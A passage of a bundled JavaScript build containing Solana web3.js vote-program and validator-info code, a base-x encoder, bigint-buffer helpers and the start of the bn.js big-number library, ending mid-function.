              isWritable: true
            }, {
              pubkey: SYSVAR_CLOCK_PUBKEY,
              isSigner: false,
              isWritable: false
            }, {
              pubkey: authorizedPubkey,
              isSigner: true,
              isWritable: false
            }],
            programId: this.programId,
            data
          });
        }
      }
      StakeProgram.programId = new PublicKey('Stake11111111111111111111111111111111111111');
      StakeProgram.space = 200;
      class VoteInit {
        constructor(nodePubkey, authorizedVoter, authorizedWithdrawer, commission) {
          this.nodePubkey = void 0;
          this.authorizedVoter = void 0;
          this.authorizedWithdrawer = void 0;
          this.commission = void 0;
          this.nodePubkey = nodePubkey;
          this.authorizedVoter = authorizedVoter;
          this.authorizedWithdrawer = authorizedWithdrawer;
          this.commission = commission;
        }
      }
      class VoteInstruction {
        constructor() {}
        static decodeInstructionType(instruction) {
          this.checkProgramId(instruction.programId);
          const instructionTypeLayout = BufferLayout__namespace.u32('instruction');
          const typeIndex = instructionTypeLayout.decode(instruction.data);
          let type;
          for (const [ixType, layout] of Object.entries(VOTE_INSTRUCTION_LAYOUTS)) {
            if (layout.index == typeIndex) {
              type = ixType;
              break;
            }
          }
          if (!type) {
            throw new Error('Instruction type incorrect; not a VoteInstruction');
          }
          return type;
        }
        static decodeInitializeAccount(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 4);
          const {
            voteInit
          } = decodeData$1(VOTE_INSTRUCTION_LAYOUTS.InitializeAccount, instruction.data);
          return {
            votePubkey: instruction.keys[0].pubkey,
            nodePubkey: instruction.keys[3].pubkey,
            voteInit: new VoteInit(new PublicKey(voteInit.nodePubkey), new PublicKey(voteInit.authorizedVoter), new PublicKey(voteInit.authorizedWithdrawer), voteInit.commission)
          };
        }
        static decodeAuthorize(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 3);
          const {
            newAuthorized,
            voteAuthorizationType
          } = decodeData$1(VOTE_INSTRUCTION_LAYOUTS.Authorize, instruction.data);
          return {
            votePubkey: instruction.keys[0].pubkey,
            authorizedPubkey: instruction.keys[2].pubkey,
            newAuthorizedPubkey: new PublicKey(newAuthorized),
            voteAuthorizationType: {
              index: voteAuthorizationType
            }
          };
        }
        static decodeAuthorizeWithSeed(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 3);
          const {
            voteAuthorizeWithSeedArgs: {
              currentAuthorityDerivedKeyOwnerPubkey,
              currentAuthorityDerivedKeySeed,
              newAuthorized,
              voteAuthorizationType
            }
          } = decodeData$1(VOTE_INSTRUCTION_LAYOUTS.AuthorizeWithSeed, instruction.data);
          return {
            currentAuthorityDerivedKeyBasePubkey: instruction.keys[2].pubkey,
            currentAuthorityDerivedKeyOwnerPubkey: new PublicKey(currentAuthorityDerivedKeyOwnerPubkey),
            currentAuthorityDerivedKeySeed: currentAuthorityDerivedKeySeed,
            newAuthorizedPubkey: new PublicKey(newAuthorized),
            voteAuthorizationType: {
              index: voteAuthorizationType
            },
            votePubkey: instruction.keys[0].pubkey
          };
        }
        static decodeWithdraw(instruction) {
          this.checkProgramId(instruction.programId);
          this.checkKeyLength(instruction.keys, 3);
          const {
            lamports
          } = decodeData$1(VOTE_INSTRUCTION_LAYOUTS.Withdraw, instruction.data);
          return {
            votePubkey: instruction.keys[0].pubkey,
            authorizedWithdrawerPubkey: instruction.keys[2].pubkey,
            lamports,
            toPubkey: instruction.keys[1].pubkey
          };
        }
        static checkProgramId(programId) {
          if (!programId.equals(VoteProgram.programId)) {
            throw new Error('invalid instruction; programId is not VoteProgram');
          }
        }
        static checkKeyLength(keys, expectedLength) {
          if (keys.length < expectedLength) {
            throw new Error(`invalid instruction; found ${keys.length} keys, expected at least ${expectedLength}`);
          }
        }
      }
      const VOTE_INSTRUCTION_LAYOUTS = Object.freeze({
        InitializeAccount: {
          index: 0,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), voteInit()])
        },
        Authorize: {
          index: 1,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), publicKey('newAuthorized'), BufferLayout__namespace.u32('voteAuthorizationType')])
        },
        Withdraw: {
          index: 3,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), BufferLayout__namespace.ns64('lamports')])
        },
        AuthorizeWithSeed: {
          index: 10,
          layout: BufferLayout__namespace.struct([BufferLayout__namespace.u32('instruction'), voteAuthorizeWithSeedArgs()])
        }
      });
      const VoteAuthorizationLayout = Object.freeze({
        Voter: {
          index: 0
        },
        Withdrawer: {
          index: 1
        }
      });
      class VoteProgram {
        constructor() {}
        static initializeAccount(params) {
          const {
            votePubkey,
            nodePubkey,
            voteInit
          } = params;
          const type = VOTE_INSTRUCTION_LAYOUTS.InitializeAccount;
          const data = encodeData(type, {
            voteInit: {
              nodePubkey: toBuffer(voteInit.nodePubkey.toBuffer()),
              authorizedVoter: toBuffer(voteInit.authorizedVoter.toBuffer()),
              authorizedWithdrawer: toBuffer(voteInit.authorizedWithdrawer.toBuffer()),
              commission: voteInit.commission
            }
          });
          const instructionData = {
            keys: [{
              pubkey: votePubkey,
              isSigner: false,
              isWritable: true
            }, {
              pubkey: SYSVAR_RENT_PUBKEY,
              isSigner: false,
              isWritable: false
            }, {
              pubkey: SYSVAR_CLOCK_PUBKEY,
              isSigner: false,
              isWritable: false
            }, {
              pubkey: nodePubkey,
              isSigner: true,
              isWritable: false
            }],
            programId: this.programId,
            data
          };
          return new TransactionInstruction(instructionData);
        }
        static createAccount(params) {
          const transaction = new Transaction();
          transaction.add(SystemProgram.createAccount({
            fromPubkey: params.fromPubkey,
            newAccountPubkey: params.votePubkey,
            lamports: params.lamports,
            space: this.space,
            programId: this.programId
          }));
          return transaction.add(this.initializeAccount({
            votePubkey: params.votePubkey,
            nodePubkey: params.voteInit.nodePubkey,
            voteInit: params.voteInit
          }));
        }
        static authorize(params) {
          const {
            votePubkey,
            authorizedPubkey,
            newAuthorizedPubkey,
            voteAuthorizationType
          } = params;
          const type = VOTE_INSTRUCTION_LAYOUTS.Authorize;
          const data = encodeData(type, {
            newAuthorized: toBuffer(newAuthorizedPubkey.toBuffer()),
            voteAuthorizationType: voteAuthorizationType.index
          });
          const keys = [{
            pubkey: votePubkey,
            isSigner: false,
            isWritable: true
          }, {
            pubkey: SYSVAR_CLOCK_PUBKEY,
            isSigner: false,
            isWritable: false
          }, {
            pubkey: authorizedPubkey,
            isSigner: true,
            isWritable: false
          }];
          return new Transaction().add({
            keys,
            programId: this.programId,
            data
          });
        }
        static authorizeWithSeed(params) {
          const {
            currentAuthorityDerivedKeyBasePubkey,
            currentAuthorityDerivedKeyOwnerPubkey,
            currentAuthorityDerivedKeySeed,
            newAuthorizedPubkey,
            voteAuthorizationType,
            votePubkey
          } = params;
          const type = VOTE_INSTRUCTION_LAYOUTS.AuthorizeWithSeed;
          const data = encodeData(type, {
            voteAuthorizeWithSeedArgs: {
              currentAuthorityDerivedKeyOwnerPubkey: toBuffer(currentAuthorityDerivedKeyOwnerPubkey.toBuffer()),
              currentAuthorityDerivedKeySeed: currentAuthorityDerivedKeySeed,
              newAuthorized: toBuffer(newAuthorizedPubkey.toBuffer()),
              voteAuthorizationType: voteAuthorizationType.index
            }
          });
          const keys = [{
            pubkey: votePubkey,
            isSigner: false,
            isWritable: true
          }, {
            pubkey: SYSVAR_CLOCK_PUBKEY,
            isSigner: false,
            isWritable: false
          }, {
            pubkey: currentAuthorityDerivedKeyBasePubkey,
            isSigner: true,
            isWritable: false
          }];
          return new Transaction().add({
            keys,
            programId: this.programId,
            data
          });
        }
        static withdraw(params) {
          const {
            votePubkey,
            authorizedWithdrawerPubkey,
            lamports,
            toPubkey
          } = params;
          const type = VOTE_INSTRUCTION_LAYOUTS.Withdraw;
          const data = encodeData(type, {
            lamports
          });
          const keys = [{
            pubkey: votePubkey,
            isSigner: false,
            isWritable: true
          }, {
            pubkey: toPubkey,
            isSigner: false,
            isWritable: true
          }, {
            pubkey: authorizedWithdrawerPubkey,
            isSigner: true,
            isWritable: false
          }];
          return new Transaction().add({
            keys,
            programId: this.programId,
            data
          });
        }
        static safeWithdraw(params, currentVoteAccountBalance, rentExemptMinimum) {
          if (params.lamports > currentVoteAccountBalance - rentExemptMinimum) {
            throw new Error('Withdraw will leave vote account with insuffcient funds.');
          }
          return VoteProgram.withdraw(params);
        }
      }
      VoteProgram.programId = new PublicKey('Vote111111111111111111111111111111111111111');
      VoteProgram.space = 3731;
      const VALIDATOR_INFO_KEY = new PublicKey('Va1idator1nfo111111111111111111111111111111');
      const InfoString = superstruct.type({
        name: superstruct.string(),
        website: superstruct.optional(superstruct.string()),
        details: superstruct.optional(superstruct.string()),
        keybaseUsername: superstruct.optional(superstruct.string())
      });
      class ValidatorInfo {
        constructor(key, info) {
          this.key = void 0;
          this.info = void 0;
          this.key = key;
          this.info = info;
        }
        static fromConfigData(buffer$1) {
          let byteArray = [...buffer$1];
          const configKeyCount = decodeLength(byteArray);
          if (configKeyCount !== 2) return null;
          const configKeys = [];
          for (let i = 0; i < 2; i++) {
            const publicKey = new PublicKey(byteArray.slice(0, PUBLIC_KEY_LENGTH));
            byteArray = byteArray.slice(PUBLIC_KEY_LENGTH);
            const isSigner = byteArray.slice(0, 1)[0] === 1;
            byteArray = byteArray.slice(1);
            configKeys.push({
              publicKey,
              isSigner
            });
          }
          if (configKeys[0].publicKey.equals(VALIDATOR_INFO_KEY)) {
            if (configKeys[1].isSigner) {
              const rawInfo = rustString().decode(buffer.Buffer.from(byteArray));
              const info = JSON.parse(rawInfo);
              superstruct.assert(info, InfoString);
              return new ValidatorInfo(configKeys[1].publicKey, info);
            }
          }
          return null;
        }
      }
      const VOTE_PROGRAM_ID = new PublicKey('Vote111111111111111111111111111111111111111');
      const VoteAccountLayout = BufferLayout__namespace.struct([publicKey('nodePubkey'), publicKey('authorizedWithdrawer'), BufferLayout__namespace.u8('commission'), BufferLayout__namespace.nu64(), BufferLayout__namespace.seq(BufferLayout__namespace.struct([BufferLayout__namespace.nu64('slot'), BufferLayout__namespace.u32('confirmationCount')]), BufferLayout__namespace.offset(BufferLayout__namespace.u32(), -8), 'votes'), BufferLayout__namespace.u8('rootSlotValid'), BufferLayout__namespace.nu64('rootSlot'), BufferLayout__namespace.nu64(), BufferLayout__namespace.seq(BufferLayout__namespace.struct([BufferLayout__namespace.nu64('epoch'), publicKey('authorizedVoter')]), BufferLayout__namespace.offset(BufferLayout__namespace.u32(), -8), 'authorizedVoters'), BufferLayout__namespace.struct([BufferLayout__namespace.seq(BufferLayout__namespace.struct([publicKey('authorizedPubkey'), BufferLayout__namespace.nu64('epochOfLastAuthorizedSwitch'), BufferLayout__namespace.nu64('targetEpoch')]), 32, 'buf'), BufferLayout__namespace.nu64('idx'), BufferLayout__namespace.u8('isEmpty')], 'priorVoters'), BufferLayout__namespace.nu64(), BufferLayout__namespace.seq(BufferLayout__namespace.struct([BufferLayout__namespace.nu64('epoch'), BufferLayout__namespace.nu64('credits'), BufferLayout__namespace.nu64('prevCredits')]), BufferLayout__namespace.offset(BufferLayout__namespace.u32(), -8), 'epochCredits'), BufferLayout__namespace.struct([BufferLayout__namespace.nu64('slot'), BufferLayout__namespace.nu64('timestamp')], 'lastTimestamp')]);
      class VoteAccount {
        constructor(args) {
          this.nodePubkey = void 0;
          this.authorizedWithdrawer = void 0;
          this.commission = void 0;
          this.rootSlot = void 0;
          this.votes = void 0;
          this.authorizedVoters = void 0;
          this.priorVoters = void 0;
          this.epochCredits = void 0;
          this.lastTimestamp = void 0;
          this.nodePubkey = args.nodePubkey;
          this.authorizedWithdrawer = args.authorizedWithdrawer;
          this.commission = args.commission;
          this.rootSlot = args.rootSlot;
          this.votes = args.votes;
          this.authorizedVoters = args.authorizedVoters;
          this.priorVoters = args.priorVoters;
          this.epochCredits = args.epochCredits;
          this.lastTimestamp = args.lastTimestamp;
        }
        static fromAccountData(buffer) {
          const versionOffset = 4;
          const va = VoteAccountLayout.decode(toBuffer(buffer), versionOffset);
          let rootSlot = va.rootSlot;
          if (!va.rootSlotValid) {
            rootSlot = null;
          }
          return new VoteAccount({
            nodePubkey: new PublicKey(va.nodePubkey),
            authorizedWithdrawer: new PublicKey(va.authorizedWithdrawer),
            commission: va.commission,
            votes: va.votes,
            rootSlot,
            authorizedVoters: va.authorizedVoters.map(parseAuthorizedVoter),
            priorVoters: getPriorVoters(va.priorVoters),
            epochCredits: va.epochCredits,
            lastTimestamp: va.lastTimestamp
          });
        }
      }
      function parseAuthorizedVoter({
        authorizedVoter,
        epoch
      }) {
        return {
          epoch,
          authorizedVoter: new PublicKey(authorizedVoter)
        };
      }
      function parsePriorVoters({
        authorizedPubkey,
        epochOfLastAuthorizedSwitch,
        targetEpoch
      }) {
        return {
          authorizedPubkey: new PublicKey(authorizedPubkey),
          epochOfLastAuthorizedSwitch,
          targetEpoch
        };
      }
      function getPriorVoters({
        buf,
        idx,
        isEmpty
      }) {
        if (isEmpty) {
          return [];
        }
        return [...buf.slice(idx + 1).map(parsePriorVoters), ...buf.slice(0, idx).map(parsePriorVoters)];
      }
      const endpoint = {
        http: {
          devnet: 'http://api.devnet.solana.com',
          testnet: 'http://api.testnet.solana.com',
          'mainnet-beta': 'http://api.mainnet-beta.solana.com/'
        },
        https: {
          devnet: 'https://api.devnet.solana.com',
          testnet: 'https://api.testnet.solana.com',
          'mainnet-beta': 'https://api.mainnet-beta.solana.com/'
        }
      };
      function clusterApiUrl(cluster, tls) {
        const key = tls === false ? 'http' : 'https';
        if (!cluster) {
          return endpoint[key]['devnet'];
        }
        const url = endpoint[key][cluster];
        if (!url) {
          throw new Error(`Unknown ${key} cluster: ${cluster}`);
        }
        return url;
      }
      async function sendAndConfirmRawTransaction(connection, rawTransaction, confirmationStrategyOrConfirmOptions, maybeConfirmOptions) {
        let confirmationStrategy;
        let options;
        if (confirmationStrategyOrConfirmOptions && Object.prototype.hasOwnProperty.call(confirmationStrategyOrConfirmOptions, 'lastValidBlockHeight')) {
          confirmationStrategy = confirmationStrategyOrConfirmOptions;
          options = maybeConfirmOptions;
        } else {
          options = confirmationStrategyOrConfirmOptions;
        }
        const sendOptions = options && {
          skipPreflight: options.skipPreflight,
          preflightCommitment: options.preflightCommitment || options.commitment,
          minContextSlot: options.minContextSlot
        };
        const signature = await connection.sendRawTransaction(rawTransaction, sendOptions);
        const commitment = options && options.commitment;
        const confirmationPromise = confirmationStrategy ? connection.confirmTransaction(confirmationStrategy, commitment) : connection.confirmTransaction(signature, commitment);
        const status = (await confirmationPromise).value;
        if (status.err) {
          throw new Error(`Raw transaction ${signature} failed (${JSON.stringify(status)})`);
        }
        return signature;
      }
      const LAMPORTS_PER_SOL = 1000000000;
      exports.Account = Account;
      exports.AddressLookupTableAccount = AddressLookupTableAccount;
      exports.AddressLookupTableInstruction = AddressLookupTableInstruction;
      exports.AddressLookupTableProgram = AddressLookupTableProgram;
      exports.Authorized = Authorized;
      exports.BLOCKHASH_CACHE_TIMEOUT_MS = BLOCKHASH_CACHE_TIMEOUT_MS;
      exports.BPF_LOADER_DEPRECATED_PROGRAM_ID = BPF_LOADER_DEPRECATED_PROGRAM_ID;
      exports.BPF_LOADER_PROGRAM_ID = BPF_LOADER_PROGRAM_ID;
      exports.BpfLoader = BpfLoader;
      exports.COMPUTE_BUDGET_INSTRUCTION_LAYOUTS = COMPUTE_BUDGET_INSTRUCTION_LAYOUTS;
      exports.ComputeBudgetInstruction = ComputeBudgetInstruction;
      exports.ComputeBudgetProgram = ComputeBudgetProgram;
      exports.Connection = Connection;
      exports.Ed25519Program = Ed25519Program;
      exports.Enum = Enum;
      exports.EpochSchedule = EpochSchedule;
      exports.FeeCalculatorLayout = FeeCalculatorLayout;
      exports.Keypair = Keypair;
      exports.LAMPORTS_PER_SOL = LAMPORTS_PER_SOL;
      exports.LOOKUP_TABLE_INSTRUCTION_LAYOUTS = LOOKUP_TABLE_INSTRUCTION_LAYOUTS;
      exports.Loader = Loader;
      exports.Lockup = Lockup;
      exports.MAX_SEED_LENGTH = MAX_SEED_LENGTH;
      exports.Message = Message;
      exports.MessageAccountKeys = MessageAccountKeys;
      exports.MessageV0 = MessageV0;
      exports.NONCE_ACCOUNT_LENGTH = NONCE_ACCOUNT_LENGTH;
      exports.NonceAccount = NonceAccount;
      exports.PACKET_DATA_SIZE = PACKET_DATA_SIZE;
      exports.PUBLIC_KEY_LENGTH = PUBLIC_KEY_LENGTH;
      exports.PublicKey = PublicKey;
      exports.SIGNATURE_LENGTH_IN_BYTES = SIGNATURE_LENGTH_IN_BYTES;
      exports.SOLANA_SCHEMA = SOLANA_SCHEMA;
      exports.STAKE_CONFIG_ID = STAKE_CONFIG_ID;
      exports.STAKE_INSTRUCTION_LAYOUTS = STAKE_INSTRUCTION_LAYOUTS;
      exports.SYSTEM_INSTRUCTION_LAYOUTS = SYSTEM_INSTRUCTION_LAYOUTS;
      exports.SYSVAR_CLOCK_PUBKEY = SYSVAR_CLOCK_PUBKEY;
      exports.SYSVAR_EPOCH_SCHEDULE_PUBKEY = SYSVAR_EPOCH_SCHEDULE_PUBKEY;
      exports.SYSVAR_INSTRUCTIONS_PUBKEY = SYSVAR_INSTRUCTIONS_PUBKEY;
      exports.SYSVAR_RECENT_BLOCKHASHES_PUBKEY = SYSVAR_RECENT_BLOCKHASHES_PUBKEY;
      exports.SYSVAR_RENT_PUBKEY = SYSVAR_RENT_PUBKEY;
      exports.SYSVAR_REWARDS_PUBKEY = SYSVAR_REWARDS_PUBKEY;
      exports.SYSVAR_SLOT_HASHES_PUBKEY = SYSVAR_SLOT_HASHES_PUBKEY;
      exports.SYSVAR_SLOT_HISTORY_PUBKEY = SYSVAR_SLOT_HISTORY_PUBKEY;
      exports.SYSVAR_STAKE_HISTORY_PUBKEY = SYSVAR_STAKE_HISTORY_PUBKEY;
      exports.Secp256k1Program = Secp256k1Program;
      exports.SendTransactionError = SendTransactionError;
      exports.SolanaJSONRPCError = SolanaJSONRPCError;
      exports.SolanaJSONRPCErrorCode = SolanaJSONRPCErrorCode;
      exports.StakeAuthorizationLayout = StakeAuthorizationLayout;
      exports.StakeInstruction = StakeInstruction;
      exports.StakeProgram = StakeProgram;
      exports.Struct = Struct;
      exports.SystemInstruction = SystemInstruction;
      exports.SystemProgram = SystemProgram;
      exports.Transaction = Transaction;
      exports.TransactionExpiredBlockheightExceededError = TransactionExpiredBlockheightExceededError;
      exports.TransactionExpiredTimeoutError = TransactionExpiredTimeoutError;
      exports.TransactionInstruction = TransactionInstruction;
      exports.TransactionMessage = TransactionMessage;
      exports.VALIDATOR_INFO_KEY = VALIDATOR_INFO_KEY;
      exports.VERSION_PREFIX_MASK = VERSION_PREFIX_MASK;
      exports.VOTE_PROGRAM_ID = VOTE_PROGRAM_ID;
      exports.ValidatorInfo = ValidatorInfo;
      exports.VersionedMessage = VersionedMessage;
      exports.VersionedTransaction = VersionedTransaction;
      exports.VoteAccount = VoteAccount;
      exports.VoteAuthorizationLayout = VoteAuthorizationLayout;
      exports.VoteInit = VoteInit;
      exports.VoteInstruction = VoteInstruction;
      exports.VoteProgram = VoteProgram;
      exports.clusterApiUrl = clusterApiUrl;
      exports.sendAndConfirmRawTransaction = sendAndConfirmRawTransaction;
      exports.sendAndConfirmTransaction = sendAndConfirmTransaction;
    }, {
      "@noble/ed25519": 32,
      "@noble/hashes/hmac": 37,
      "@noble/hashes/sha256": 40,
      "@noble/hashes/sha3": 41,
      "@noble/hashes/sha512": 42,
      "@noble/secp256k1": 44,
      "@solana/buffer-layout": 47,
      "bigint-buffer": 50,
      "bn.js": 51,
      "borsh": 52,
      "bs58": 53,
      "buffer": 3,
      "jayson/lib/client/browser": 55,
      "rpc-websockets": 57,
      "superstruct": 61
    }],
    49: [function (require, module, exports) {
      'use strict';

      var _Buffer = require('safe-buffer').Buffer;
      function base(ALPHABET) {
        if (ALPHABET.length >= 255) {
          throw new TypeError('Alphabet too long');
        }
        var BASE_MAP = new Uint8Array(256);
        for (var j = 0; j < BASE_MAP.length; j++) {
          BASE_MAP[j] = 255;
        }
        for (var i = 0; i < ALPHABET.length; i++) {
          var x = ALPHABET.charAt(i);
          var xc = x.charCodeAt(0);
          if (BASE_MAP[xc] !== 255) {
            throw new TypeError(x + ' is ambiguous');
          }
          BASE_MAP[xc] = i;
        }
        var BASE = ALPHABET.length;
        var LEADER = ALPHABET.charAt(0);
        var FACTOR = Math.log(BASE) / Math.log(256);
        var iFACTOR = Math.log(256) / Math.log(BASE);
        function encode(source) {
          if (Array.isArray(source) || source instanceof Uint8Array) {
            source = _Buffer.from(source);
          }
          if (!_Buffer.isBuffer(source)) {
            throw new TypeError('Expected Buffer');
          }
          if (source.length === 0) {
            return '';
          }
          var zeroes = 0;
          var length = 0;
          var pbegin = 0;
          var pend = source.length;
          while (pbegin !== pend && source[pbegin] === 0) {
            pbegin++;
            zeroes++;
          }
          var size = (pend - pbegin) * iFACTOR + 1 >>> 0;
          var b58 = new Uint8Array(size);
          while (pbegin !== pend) {
            var carry = source[pbegin];
            var i = 0;
            for (var it1 = size - 1; (carry !== 0 || i < length) && it1 !== -1; it1--, i++) {
              carry += 256 * b58[it1] >>> 0;
              b58[it1] = carry % BASE >>> 0;
              carry = carry / BASE >>> 0;
            }
            if (carry !== 0) {
              throw new Error('Non-zero carry');
            }
            length = i;
            pbegin++;
          }
          var it2 = size - length;
          while (it2 !== size && b58[it2] === 0) {
            it2++;
          }
          var str = LEADER.repeat(zeroes);
          for (; it2 < size; ++it2) {
            str += ALPHABET.charAt(b58[it2]);
          }
          return str;
        }
        function decodeUnsafe(source) {
          if (typeof source !== 'string') {
            throw new TypeError('Expected String');
          }
          if (source.length === 0) {
            return _Buffer.alloc(0);
          }
          var psz = 0;
          var zeroes = 0;
          var length = 0;
          while (source[psz] === LEADER) {
            zeroes++;
            psz++;
          }
          var size = (source.length - psz) * FACTOR + 1 >>> 0;
          var b256 = new Uint8Array(size);
          while (source[psz]) {
            var carry = BASE_MAP[source.charCodeAt(psz)];
            if (carry === 255) {
              return;
            }
            var i = 0;
            for (var it3 = size - 1; (carry !== 0 || i < length) && it3 !== -1; it3--, i++) {
              carry += BASE * b256[it3] >>> 0;
              b256[it3] = carry % 256 >>> 0;
              carry = carry / 256 >>> 0;
            }
            if (carry !== 0) {
              throw new Error('Non-zero carry');
            }
            length = i;
            psz++;
          }
          var it4 = size - length;
          while (it4 !== size && b256[it4] === 0) {
            it4++;
          }
          var vch = _Buffer.allocUnsafe(zeroes + (size - it4));
          vch.fill(0x00, 0, zeroes);
          var j = zeroes;
          while (it4 !== size) {
            vch[j++] = b256[it4++];
          }
          return vch;
        }
        function decode(string) {
          var buffer = decodeUnsafe(string);
          if (buffer) {
            return buffer;
          }
          throw new Error('Non-base' + BASE + ' character');
        }
        return {
          encode: encode,
          decodeUnsafe: decodeUnsafe,
          decode: decode
        };
      }
      module.exports = base;
    }, {
      "safe-buffer": 60
    }],
    50: [function (require, module, exports) {
      (function () {
        (function () {
          'use strict';

          Object.defineProperty(exports, "__esModule", {
            value: true
          });
          let converter;
          function toBigIntLE(buf) {
            {
              const reversed = Buffer.from(buf);
              reversed.reverse();
              const hex = reversed.toString('hex');
              if (hex.length === 0) {
                return BigInt(0);
              }
              return BigInt(`0x${hex}`);
            }
            return converter.toBigInt(buf, false);
          }
          exports.toBigIntLE = toBigIntLE;
          function toBigIntBE(buf) {
            {
              const hex = buf.toString('hex');
              if (hex.length === 0) {
                return BigInt(0);
              }
              return BigInt(`0x${hex}`);
            }
            return converter.toBigInt(buf, true);
          }
          exports.toBigIntBE = toBigIntBE;
          function toBufferLE(num, width) {
            {
              const hex = num.toString(16);
              const buffer = Buffer.from(hex.padStart(width * 2, '0').slice(0, width * 2), 'hex');
              buffer.reverse();
              return buffer;
            }
            return converter.fromBigInt(num, Buffer.allocUnsafe(width), false);
          }
          exports.toBufferLE = toBufferLE;
          function toBufferBE(num, width) {
            {
              const hex = num.toString(16);
              return Buffer.from(hex.padStart(width * 2, '0').slice(0, width * 2), 'hex');
            }
            return converter.fromBigInt(num, Buffer.allocUnsafe(width), true);
          }
          exports.toBufferBE = toBufferBE;
        }).call(this);
      }).call(this, require("buffer").Buffer);
    }, {
      "buffer": 3
    }],
    51: [function (require, module, exports) {
      (function (module, exports) {
        'use strict';

        function assert(val, msg) {
          if (!val) throw new Error(msg || 'Assertion failed');
        }
        function inherits(ctor, superCtor) {
          ctor.super_ = superCtor;
          var TempCtor = function () {};
          TempCtor.prototype = superCtor.prototype;
          ctor.prototype = new TempCtor();
          ctor.prototype.constructor = ctor;
        }
        function BN(number, base, endian) {
          if (BN.isBN(number)) {
            return number;
          }
          this.negative = 0;
          this.words = null;
          this.length = 0;
          this.red = null;
          if (number !== null) {
            if (base === 'le' || base === 'be') {
              endian = base;
              base = 10;
            }
            this._init(number || 0, base || 10, endian || 'be');
          }
        }
        if (typeof module === 'object') {
          module.exports = BN;
        } else {
          exports.BN = BN;
        }
        BN.BN = BN;
        BN.wordSize = 26;
        var Buffer;
        try {
          if (typeof window !== 'undefined' && typeof window.Buffer !== 'undefined') {
            Buffer = window.Buffer;
          } else {
            Buffer = require('buffer').Buffer;
          }
        } catch (e) {}
        BN.isBN = function isBN(num) {
          if (num instanceof BN) {
            return true;
          }
          return num !== null && typeof num === 'object' && num.constructor.wordSize === BN.wordSize && Array.isArray(num.words);
        };
        BN.max = function max(left, right) {
          if (left.cmp(right) > 0) return left;
          return right;
        };
        BN.min = function min(left, right) {
          if (left.cmp(right) < 0) return left;
          return right;
        };
        BN.prototype._init = function init(number, base, endian) {
          if (typeof number === 'number') {
            return this._initNumber(number, base, endian);
          }
          if (typeof number === 'object') {
            return this._initArray(number, base, endian);
          }
          if (base === 'hex') {
            base = 16;
          }
          assert(base === (base | 0) && base >= 2 && base <= 36);
          number = number.toString().replace(/\s+/g, '');
          var start = 0;
          if (number[0] === '-') {
            start++;
            this.negative = 1;
          }
          if (start < number.length) {
            if (base === 16) {
              this._parseHex(number, start, endian);
            } else {
              this._parseBase(number, base, start);
              if (endian === 'le') {
                this._initArray(this.toArray(), base, endian);
              }
            }
          }
        };
        BN.prototype._initNumber = function _initNumber(number, base, endian) {
          if (number < 0) {
            this.negative = 1;
            number = -number;
          }
          if (number < 0x4000000) {
            this.words = [number & 0x3ffffff];
            this.length = 1;
          } else if (number < 0x10000000000000) {
            this.words = [number & 0x3ffffff, number / 0x4000000 & 0x3ffffff];
            this.length = 2;
          } else {
            assert(number < 0x20000000000000);
            this.words = [number & 0x3ffffff, number / 0x4000000 & 0x3ffffff, 1];
            this.length = 3;
          }
          if (endian !== 'le') return;
          this._initArray(this.toArray(), base, endian);
        };
        BN.prototype._initArray = function _initArray(number, base, endian) {
          assert(typeof number.length === 'number');
          if (number.length <= 0) {
            this.words = [0];
            this.length = 1;
            return this;
          }
          this.length = Math.ceil(number.length / 3);
          this.words = new Array(this.length);
          for (var i = 0; i < this.length; i++) {
            this.words[i] = 0;
          }
          var j, w;
          var off = 0;
          if (endian === 'be') {
            for (i = number.length - 1, j = 0; i >= 0; i -= 3) {
              w = number[i] | number[i - 1] << 8 | number[i - 2] << 16;
              this.words[j] |= w << off & 0x3ffffff;
              this.words[j + 1] = w >>> 26 - off & 0x3ffffff;
              off += 24;
              if (off >= 26) {
                off -= 26;
                j++;
              }
            }
          } else if (endian === 'le') {
            for (i = 0, j = 0; i < number.length; i += 3) {
              w = number[i] | number[i + 1] << 8 | number[i + 2] << 16;
              this.words[j] |= w << off & 0x3ffffff;
              this.words[j + 1] = w >>> 26 - off & 0x3ffffff;
              off += 24;
              if (off >= 26) {
                off -= 26;
                j++;
              }
            }
          }
          return this._strip();
        };
        function parseHex4Bits(string, index) {
          var c = string.charCodeAt(index);
          if (c >= 48 && c <= 57) {
            return c - 48;
          } else if (c >= 65 && c <= 70) {
            return c - 55;
          } else if (c >= 97 && c <= 102) {
            return c - 87;
          } else {
            assert(false, 'Invalid character in ' + string);
          }
        }
        function parseHexByte(string, lowerBound, index) {
          var r = parseHex4Bits(string, index);
          if (index - 1 >= lowerBound) {
            r |= parseHex4Bits(string, index - 1) << 4;
          }
          return r;
        }
        BN.prototype._parseHex = function _parseHex(number, start, endian) {
          this.length = Math.ceil((number.length - start) / 6);
          this.words = new Array(this.length);
          for (var i = 0; i < this.length; i++) {
            this.words[i] = 0;
          }
          var off = 0;
          var j = 0;
          var w;
          if (endian === 'be') {
            for (i = number.length - 1; i >= start; i -= 2) {
              w = parseHexByte(number, start, i) << off;
              this.words[j] |= w & 0x3ffffff;
              if (off >= 18) {
                off -= 18;
                j += 1;
                this.words[j] |= w >>> 26;
              } else {
                off += 8;
              }
            }
          } else {
            var parseLength = number.length - start;
            for (i = parseLength % 2 === 0 ? start + 1 : start; i < number.length; i += 2) {
              w = parseHexByte(number, start, i) << off;
              this.words[j] |= w & 0x3ffffff;
              if (off >= 18) {
                off -= 18;
                j += 1;
                this.words[j] |= w >>> 26;
              } else {
                off += 8;
              }
            }
          }
          this._strip();
        };
        function parseBase(str, start, end, mul) {
          var r = 0;
          var b = 0;
          var len = Math.min(str.length, end);
          for (var i = start; i < len; i++) {
            var c = str.charCodeAt(i) - 48;
            r *= mul;
            if (c >= 49) {
              b = c - 49 + 0xa;
            } else if (c >= 17) {
              b = c - 17 + 0xa;
            } else {
              b = c;
            }
            assert(c >= 0 && b < mul, 'Invalid character');
            r += b;
          }
          return r;
        }
        BN.prototype._parseBase = function _parseBase(number, base, start) {
          this.words = [0];
          this.length = 1;
          for (var limbLen = 0, limbPow = 1; limbPow <= 0x3ffffff; limbPow *= base) {
            limbLen++;
          }
          limbLen--;
          limbPow = limbPow / base | 0;
          var total = number.length - start;
